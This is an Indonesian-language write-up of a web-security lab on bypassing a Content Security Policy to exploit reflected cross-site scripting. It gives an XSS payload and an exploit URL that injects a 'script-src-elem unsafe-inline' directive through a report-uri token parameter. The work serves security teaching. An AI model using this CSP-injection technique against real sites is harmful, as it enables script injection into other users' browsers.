# Reflected XSS protected by CSP, with CSP bypass

Lab ini menggunakan **CSP (Content Security Policy)** dan mengandung kerentanan **reflected XSS**.

Untuk menyelesaikan lab ini, lakukan serangan **cross-site scripting (XSS)** yang dapat **melewati CSP (bypass CSP)** dan memanggil fungsi `alert`.

Perlu diperhatikan bahwa solusi yang dimaksud untuk lab ini **hanya bisa dilakukan di browser Chrome**.


## Solusi

1. Masukkan berikut ke dalam kotak pencarian:

```html 
<img src=1 onerror=alert(1)>
```

2. Perhatikan bahwa payload tersebut muncul kembali (reflected), tetapi **CSP mencegah script dijalankan**.

```html
<h1>0 search results for '<img src="1" onerror="alert(1)">'</h1>
```

3. Perhatikan bahwa response mengandung header **Content-Security-Policy**, dan directive `report-uri` memiliki parameter bernama `token`. Karena parameter `token` bisa kamu kontrol, kamu dapat menyisipkan directive CSP milikmu sendiri ke dalam policy.

```http
content-security-policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=
```

4. Kunjungi URL berikut, dengan mengganti **YOUR-LAB-ID** dengan ID lab kamu:

```text 
https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27
```

Eksploit ini menggunakan directive **`script-src-elem`** pada CSP. Directive ini memungkinkan kamu menargetkan hanya elemen `<script>`.
Dengan directive ini, kamu dapat menimpa aturan `script-src` yang ada, sehingga memungkinkan penggunaan **`unsafe-inline`**, yang pada akhirnya mengizinkan eksekusi script inline seperti `<script>alert(1)</script>`.
